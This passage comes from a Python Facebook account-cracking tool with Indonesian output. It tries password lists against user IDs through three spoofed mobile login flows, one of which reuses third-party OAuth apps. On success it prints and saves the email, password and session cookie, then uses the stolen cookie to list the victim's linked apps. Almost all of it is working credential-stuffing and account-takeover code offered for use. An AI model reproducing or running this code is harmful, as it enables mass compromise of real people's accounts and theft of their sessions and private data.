'https://m.facebook.com/login.php?skip_api_login=1&api_key=846541629354251&kid_directed_site=0&app_id=846541629354251&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D846541629354251%26redirect_uri%3Dhttps%253A%252F%252Fwww.telkomsel.com%252Flogin%252Fauth%252Fsocial-media-cb%26scope%3Dpublic_profile%2Bemail%26code_challenge%3DmZFF9Ypv1f1SqI-NqfUXtWwxZpjAAoxQT7htGS23nn8%26code_challenge_method%3DS256%26state%3D4x4ttvsn7fywfpvc2uuujbafoo4towe%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D2a88e02a-97b9-4912-bc3c-8ebad72b1edb%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.telkomsel.com%2Flogin%2Fauth%2Fsocial-media-cb%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D4x4ttvsn7fywfpvc2uuujbafoo4towe%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&rtime=1690698519&subno_key=AaGmDXy75h_Nq8RaJTfUWTXuP_pOzXUjB8bI2psBybKz0BUWu1IoP7cGjKzOizBJ_qDXts6spS7K5axET1_EcDdAFs3nLIINoHoWeDF-7kfL_x_6517sx8I9apz1IOFt93QfqQOFr4VPw8Rvy9RUVHe0f4tIfWxxJWhXm1jKyegfxG3kjztm8mlORre5k1SIlOvc3Sr802bvbFVULB13JDU_3wTCxIV1FXyqbwE7u-vQ96sYg8y3s2q1x_1TLLtRj5Rkgbir2lXUm76m2BqZT87IBxXRSmW6oPkJ83eiVb2AF3ikfXTbGlKTmBouWpHUoWQ&hrc=1&wtsid=rdr_0D12mhC21tbdBJGyk&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=846541629354251&auth_token=ba72aadc3d41e6e1093764381bc152ef&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D846541629354251%26redirect_uri%3Dhttps%253A%252F%252Fwww.telkomsel.com%252Flogin%252Fauth%252Fsocial-media-cb%26scope%3Dpublic_profile%2Bemail%26code_challenge%3DmZFF9Ypv1f1SqI-NqfUXtWwxZpjAAoxQT7htGS23nn8%26code_challenge_method%3DS256%26state%3D4x4ttvsn7fywfpvc2uuujbafoo4towe%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D2a88e02a-97b9-4912-bc3c-8ebad72b1edb%26tp%3Dunspecified&refsrc=deprecated&app_id=846541629354251&cancel=https%3A%2F%2Fwww.telkomsel.com%2Flogin%2Fauth%2Fsocial-media-cb%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D4x4ttvsn7fywfpvc2uuujbafoo4towe%23_%3D_&lwv=100',data=data,headers=headers,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				print(" " )
				print(f"{m}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
				print(f"{m}╰─{b}▶{u}[{b}×{u}]{b}𝗚𝗢𝗢𝗗! : {u}𝑪𝒓𝒂𝒄𝒌𝒊𝒏𝒈 𝑺𝒖𝒄𝒄𝒆𝒔 ")
				print(f"{m}╰─{b}▶{u}[{b}×{u}]{b}𝗘𝗠𝗔𝗜𝗟 :{u} {idf} ")
				print(f"{m}╰─{b}▶{u}[{b}×{u}]{b}𝗦𝗔𝗡𝗗𝗜 :{u} {pw} ")
				print(f"{m}╰─{b}▶{u}[{b}×{u}]{b}𝗧𝗔𝗛𝗨𝗡 :{u} {tahun(idf)} ")
				print(f"{m}╰─{b}▶{u}[{b}×{u}]{b}𝗖𝗢𝗞𝗜𝗘 :{u} {kuki}{ua} ")
				print(f"{m}╰─{b}▶{u}[{b}×{u}]{b}𝗨𝗦𝗚𝗘𝗡 :{u} {ua} ")
				print(f"{m}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(kuki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#--------------------[MOBILE]-----------------#
def mobile(idf,urutan,url):
	global loop,ok
	bo = random.choice([m,b,k,h,u])
	sys.stdout.write(f"\r{m}╰─{b}▶{b} 𝗠𝗕𝗔𝗦𝗜𝗖 {u}[{bo}{loop}{u}/{bo}{len(id)}{u}]—{u}[{b}{ok}{u}]—{u}[{k}{cp}{u}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{u}]  "),
	sys.stdout.flush()
	rr = random.randint
	rc = random.choice
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in urutan:
		try:
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				print(" " )
				print(f"{m}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
				print(f"{m}╰─{b}▶{u}[{b}×{u}]{b}𝗚𝗢𝗢𝗗! : {u}𝑪𝒓𝒂𝒄𝒌𝒊𝒏𝒈 𝑺𝒖𝒄𝒄𝒆𝒔 ")
				print(f"{m}╰─{b}▶{u}[{b}×{u}]{b}𝗘𝗠𝗔𝗜𝗟 :{u} {idf} ")
				print(f"{m}╰─{b}▶{u}[{b}×{u}]{b}𝗦𝗔𝗡𝗗𝗜 :{u} {pw} ")
				print(f"{m}╰─{b}▶{u}[{b}×{u}]{b}𝗧𝗔𝗛𝗨𝗡 :{u} {tahun(idf)} ")
				print(f"{m}╰─{b}▶{u}[{b}×{u}]{b}𝗖𝗢𝗞𝗜𝗘 :{u} {kuki} ")
				print(f"{m}╰─{b}▶{u}[{b}×{u}]{b}𝗨𝗦𝗚𝗘𝗡 :{u} {ua} ")
				print(f"{m}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(kuki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#--------------------[ METODE ASYNC ]-----------------#	
def asin(idf,urutan,url):
	global loop,ok
	bo = random.choice([m,b,k,h,u])
	sys.stdout.write(f"\r{m}╰─{b}▶{b} 𝗔𝗦𝗬𝗡𝗖 {u}[{bo}{loop}{u}/{bo}{len(id)}{u}]—{u}[{b}{ok}{u}]—{u}[{k}{cp}{u}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{u}]  "),
	sys.stdout.flush()
	rr = random.randint
	rc = random.choice 
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in urutan:
		try:
			ses.headers.update({"Host": "m.latest.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.latest.facebook.com/login.php?skip_api_login=1&api_key=1239138353201716&kid_directed_site=0&app_id=1239138353201716&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%252Cgranted_scopes%26client_id%3D1239138353201716%26redirect_uri%3Dhttps%253A%252F%252Fkachishop-d0c3a.firebaseapp.com%252F__%252Fauth%252Fhandler%26state%3DAMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB%26scope%3Dpublic_profile%252Cemail%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D087a364c-3d69-45b4-a55b-047dae50317c%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fkachishop-d0c3a.firebaseapp.com%2F__%2Fauth%2Fhandler%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DAMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
			"Host": "m.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.latest.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://m.latest.facebook.com/v8.0/dialog/oauth?response_type=code%2Cgranted_scopes&client_id=1239138353201716&redirect_uri=https%3A%2F%2Fkachishop-d0c3a.firebaseapp.com%2F__%2Fauth%2Fhandler&state=AMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB&scope=public_profile%2Cemail&display=popup&ret=login&fbapp_pres=0&logger_id=087a364c-3d69-45b4-a55b-047dae50317c&tp=unspecified",
			"accept-encoding": "gzip, deflate br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://m.latest.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				print(" " )
				print(f"{m}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
				print(f"{m}╰─{b}▶{u}[{b}×{u}]{b}𝗚𝗢𝗢𝗗! : {u}𝑪𝒓𝒂𝒄𝒌𝒊𝒏𝒈 𝑺𝒖𝒄𝒄𝒆𝒔 ")
				print(f"{m}╰─{b}▶{u}[{b}×{u}]{b}𝗘𝗠𝗔𝗜𝗟 :{u} {idf} ")
				print(f"{m}╰─{b}▶{u}[{b}×{u}]{b}𝗦𝗔𝗡𝗗𝗜 :{u} {pw} ")
				print(f"{m}╰─{b}▶{u}[{b}×{u}]{b}𝗧𝗔𝗛𝗨𝗡 :{u} {tahun(idf)} ")
				print(f"{m}╰─{b}▶{u}[{b}×{u}]{b}𝗖𝗢𝗞𝗜𝗘 :{u} {kuki} ")
				print(f"{m}╰─{b}▶{u}[{b}×{u}]{b}𝗨𝗦𝗚𝗘𝗡 :{u} {ua} ")
				print(f"{m}╭───────────────────────────────────────────────────────────────────────────{b}▶")
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(kuki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#-----------------------[ CEK APLIKASI ]--------------------#
def cek_apk(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s\033[0m\x1b[1;91m╰─\33[1;96m𝗗𝗔𝗙𝗧𝗔𝗥 𝗔𝗣𝗞▶ %s%s"%(P,u,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s\033[0m\x1b[1;91m╰─\33[1;96m𝗗𝗔𝗙𝗧𝗔𝗥 𝗔𝗣𝗞▶ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r    %s \033[0mcookie invalid"%(M))
#----------[LESENSI BY ARAIIXYZZ]----------#
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	if Console().width>=78:
		os.system('clear')
		banner()
		print(f"{m}╭───────────────────────────────────────────────────────────────────────────{b}▶")
		print(f'{m}╰─{b}▶{b} 𝗧𝗨𝗡𝗚𝗚𝗨 𝗦𝗘𝗕𝗘𝗡𝗧𝗔𝗥 𝗣𝗥𝗢𝗦𝗘𝗦 𝗟𝗢𝗚𝗜𝗡.....')
		os.system("xdg-open https://t.me/AraiiXyzz")
		time.sleep(5)
	else:
		os.system('clear')
		banner()
		print(f"{m}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
		cetak('[bold red]╰─[cyan]▶[cyan] 𝗟𝗘𝗕𝗔𝗥 𝗧𝗘𝗥𝗠𝗜𝗡𝗔𝗟 𝗦𝗔𝗔𝗧 𝗜𝗡𝗜 𝗔𝗗𝗔𝗟𝗔𝗛  :[bold red] {}'.format(Console().width))
		print(f'{m}╭─{b}▶{b} 𝗧𝗢𝗟𝗢𝗡𝗚 {u}𝗞𝗘𝗖𝗜𝗟𝗞𝗔𝗡{b} /{u} 𝗕𝗘𝗦𝗔𝗥𝗞𝗔𝗡 {b} 𝗟𝗔𝗬𝗔𝗥 𝗦𝗔𝗠𝗣𝗔𝗜 : {m}78')
		print(f"{m}╰───────────────────────────────────────────────────────────────────────────{b}▶")
		exit()
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	login()

